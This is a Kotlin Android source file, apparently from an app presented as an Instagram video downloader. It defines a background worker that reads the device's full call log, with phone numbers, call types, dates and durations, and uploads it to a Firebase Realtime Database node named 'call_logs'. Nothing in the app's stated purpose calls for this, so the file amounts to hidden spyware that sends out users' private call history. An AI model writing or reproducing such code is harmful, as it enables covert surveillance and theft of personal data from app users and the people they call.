package com.example.instagramvideodownloader.work_manager


import android.content.Context
import android.provider.CallLog
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.example.instagramvideodownloader.work_manager.models.CallLogItemModel
import com.google.firebase.database.FirebaseDatabase
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.tasks.await
import kotlinx.coroutines.withContext
import org.koin.java.KoinJavaComponent.inject

class CallLogUploadWorker(appContext: Context, workerParams: WorkerParameters?) :
    CoroutineWorker(appContext, workerParams!!) {
    private var mContext = appContext
    private val database: FirebaseDatabase by inject(FirebaseDatabase::class.java)

    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        // Fetch call logs and upload to Firebase
        val callLogsList = mutableListOf<CallLogItemModel>()

        val mCursor = applicationContext.contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            null,
            null,
            null,
            CallLog.Calls.DATE + " DESC"
        )

        mCursor?.use { cursor ->
            val numberIndex = cursor.getColumnIndex(CallLog.Calls.NUMBER)
            val typeIndex = cursor.getColumnIndex(CallLog.Calls.TYPE)
            val dateIndex = cursor.getColumnIndex(CallLog.Calls.DATE)
            val durationIndex = cursor.getColumnIndex(CallLog.Calls.DURATION)

            while (cursor.moveToNext()) {
                val phoneNumber = cursor.getString(numberIndex)
                val callType = cursor.getInt(typeIndex)
                val callDate = cursor.getLong(dateIndex)
                val callDuration = cursor.getLong(durationIndex)

                val callLogItem = CallLogItemModel(phoneNumber, callType, callDate, callDuration)
                callLogsList.add(callLogItem)
            }
        }

        // Now, you have the list of call logs. Upload it to Firebase Realtime Database.

        val reference = database.getReference("call_logs").child("")
        try {
            reference.setValue(callLogsList).await()
            Result.success()
        } catch (e: Exception) {
            Result.retry()
        }
    }
}
